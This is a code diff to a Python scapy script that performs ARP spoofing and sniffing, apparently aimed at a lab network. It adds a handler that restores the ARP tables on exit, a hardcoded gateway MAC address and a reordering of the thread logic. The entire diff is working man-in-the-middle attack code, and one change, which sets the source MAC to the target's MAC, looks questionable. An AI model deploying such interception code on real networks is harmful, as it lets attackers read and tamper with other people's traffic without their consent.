@@ -5,6 +5,25 @@ import threading
 import time
 import logging
 import re
+import signal
+
+run = True
+
+def handler_stop_signals(signum, frame):
+    global run
+    run = False
+    stop_event.set()
+    log.warning(f"Signal received : {signum}")
+    for _ in range(10):
+        log.warning(f"Sending to {args.ip_target}, {ip_gateway}, {mac_gateway}")
+        log.warning(f"Sending to {ip_gateway}, {args.ip_target}, {args.mac_target}")
+        arp_spoof(args.ip_target, ip_gateway, mac_gateway)
+        arp_spoof(ip_gateway, args.ip_target, args.mac_target)
+        time.sleep(1)
+    exit(0)
+
+signal.signal(signal.SIGINT, handler_stop_signals)
+signal.signal(signal.SIGTERM, handler_stop_signals)
 
 stop_event = threading.Event()
 
@@ -18,9 +37,10 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 # mac_target = "02:42:0a:0a:08:02"
 
 ip_gateway = "10.10.8.4"
+mac_gateway = "02:42:0a:0a:08:04"
 
 def arp_spoof(target_ip, gateway_ip, target_mac):
-    arp_packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
+    arp_packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=target_mac)
     try:
         send(arp_packet, verbose=False)
     except:
@@ -75,10 +95,10 @@ if __name__ == "__main__":
 
     try:
         spoofing = threading.Thread(target=threaded_spoofing, args=(args.ip_target, ip_gateway, args.mac_src))
-        spoofing.start()
         sniffing = threading.Thread(target=threaded_sniffing)
+        spoofing.start()
         sniffing.start()
-    except KeyboardInterrupt:
-        print("Sending kill to all threads")
-        stop_event.set()
         spoofing.join()
+        sniffing.join()
+    except:
+        log.warning("Can't create threads, exiting now")
